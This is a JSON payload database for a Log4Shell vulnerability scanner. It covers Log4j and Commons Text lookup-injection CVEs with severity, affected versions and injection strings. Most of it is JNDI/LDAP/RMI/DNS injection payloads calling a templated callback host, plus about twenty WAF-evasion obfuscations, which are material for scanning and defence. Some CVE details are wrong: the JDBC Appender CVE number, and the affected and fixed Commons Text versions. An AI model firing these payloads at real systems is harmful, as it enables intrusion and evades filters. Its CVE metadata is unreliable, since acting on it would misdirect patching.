{
  "metadata": {
    "name": "log4j-scan CVE knowledge base",
    "description": "Offline, bundled detection payloads for Apache Log4Shell and related JNDI/lookup injection CVEs. Refresh with: python3 log4j-scan.py --update-cves",
    "version": "2026.10.03",
    "last_updated": "2026-10-03T00:00:00Z",
    "sources": [
      "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
      "https://nvd.nist.gov/vuln/detail/CVE-2021-45046",
      "https://nvd.nist.gov/vuln/detail/CVE-2021-45105",
      "https://nvd.nist.gov/vuln/detail/CVE-2021-44827",
      "https://nvd.nist.gov/vuln/detail/CVE-2022-42889"
    ]
  },
  "cves": {
    "CVE-2021-44228": {
      "title": "Apache Log4j2 Remote Code Execution (Log4Shell)",
      "severity": "CRITICAL",
      "cvss_v3": 10.0,
      "affected": "Apache Log4j 2.0-beta7 through 2.14.1",
      "fixed_in": "2.15.0 (recommend 2.17.1+)",
      "oob_required": true,
      "default": true,
      "payloads": [
        "${jndi:ldap://{{callback_host}}/{{random}}}",
        "${jndi:dns://{{callback_host}}/{{random}}}",
        "${jndi:rmi://{{callback_host}}/{{random}}}",
        "${jndi:ldap://{{callback_host}}:1389/{{random}}}"
      ],
      "waf_bypass_payloads": [
        "${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://{{callback_host}}/{{random}}}",
        "${${::-j}ndi:rmi://{{callback_host}}/{{random}}}",
        "${jndi:rmi://{{callback_host}}}/",
        "${${lower:jndi}:${lower:rmi}://{{callback_host}}/{{random}}}",
        "${${lower:${lower:jndi}}:${lower:rmi}://{{callback_host}}/{{random}}}",
        "${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://{{callback_host}}/{{random}}}",
        "${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://{{callback_host}}/{{random}}}",
        "${jnd${123%25ff:-${123%25ff:-i:}}ldap://{{callback_host}}/{{random}}}",
        "${jndi:dns://{{callback_host}}}",
        "${j${k8s:k5:-ND}i:ldap://{{callback_host}}/{{random}}}",
        "${j${k8s:k5:-ND}i:ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
        "${j${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
        "${j${k8s:k5:-ND}i${sd:k5:-:}ldap${sd:k5:-:}//{{callback_host}}/{{random}}}",
        "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap://{{callback_host}}/{{random}}}",
        "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}ldap{sd:k5:-:}//{{callback_host}}/{{random}}}",
        "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}ap${sd:k5:-:}//{{callback_host}}/{{random}}}",
        "${j${k8s:k5:-ND}i${sd:k5:-:}${lower:L}dap${sd:k5:-:}//{{callback_host}}/{{random}}",
        "${${k8s:k5:-J}${k8s:k5:-ND}i${sd:k5:-:}l${lower:D}a${::-p}${sd:k5:-:}//{{callback_host}}/{{random}}}",
        "${jndi:${lower:l}${lower:d}a${lower:p}://{{callback_host}}}",
        "${jnd${upper:i}:ldap://{{callback_host}}/{{random}}}",
        "${j${${:-l}${:-o}${:-w}${:-e}${:-r}:n}di:ldap://{{callback_host}}/{{random}}}"
      ]
    },
    "CVE-2021-45046": {
      "title": "Apache Log4j2 DoS and potential RCE - CVE-2021-44228 partial fix bypass",
      "severity": "CRITICAL",
      "cvss_v3": 9.0,
      "affected": "Apache Log4j 2.0-beta7 through 2.15.0 (default configurations)",
      "fixed_in": "2.16.0 (recommend 2.17.1+)",
      "oob_required": true,
      "default": false,
      "payloads": [
        "${jndi:ldap://127.0.0.1#{{callback_host}}:1389/{{random}}}",
        "${jndi:ldap://127.0.0.1#{{callback_host}}/{{random}}}",
        "${jndi:ldap://127.1.1.1#{{callback_host}}/{{random}}}"
      ],
      "waf_bypass_payloads": []
    },
    "CVE-2021-45105": {
      "title": "Apache Log4j2 Denial of Service via unbounded recursion in Thread Context Map interpolator",
      "severity": "MODERATE",
      "cvss_v3": 5.9,
      "affected": "Apache Log4j 2.0-alpha1 through 2.16.0 (non-default configurations using Context Data lookups in patterns)",
      "fixed_in": "2.17.0",
      "oob_required": true,
      "default": false,
      "payloads": [
        "${${::-${::-$}}:/:ctx:{{random}}.{{callback_host}}}",
        "${ctx:{{random}}.{{callback_host}}",
        "$${ctx:{{random}}.{{callback_host}}",
        "${map:{{random}}.{{callback_host}}",
        "${sys:{{random}}.{{callback_host}}"
      ],
      "waf_bypass_payloads": []
    },
    "CVE-2021-44827": {
      "title": "Apache Log4j2 RCE via JDBC Appender when attacker controls configuration",
      "severity": "MODERATE",
      "cvss_v3": 6.6,
      "affected": "Apache Log4j 2.0-beta7 through 2.17.0 (requires attacker-controlled configuration), 2.17.1 not affected by data source lookup",
      "fixed_in": "2.17.1",
      "oob_required": true,
      "default": false,
      "payloads": [
        "${jndi:ldap://{{callback_host}}/{{random}}?config=jdbc}",
        "${jndi:dns://{{random}}.jdbc.{{callback_host}}}"
      ],
      "waf_bypass_payloads": []
    },
    "CVE-2022-42889": {
      "title": "Apache Commons Text Remote Code Execution (Text4Shell)",
      "severity": "CRITICAL",
      "cvss_v3": 9.8,
      "affected": "Apache Commons Text 1.5 through 1.10.0",
      "fixed_in": "1.10.1",
      "oob_required": true,
      "default": false,
      "payloads": [
        "${url:UTF-8::https://{{callback_host}}/}",
        "${url:UTF-8::https://{{callback_host}}/{{random}}}",
        "${url:UTF-8::http://{{callback_host}}/}",
        "${url:UTF-8::http://{{callback_host}}/{{random}}}",
        "${dns:address|{{callback_host}}}"
      ],
      "waf_bypass_payloads": []
    }
  }
}
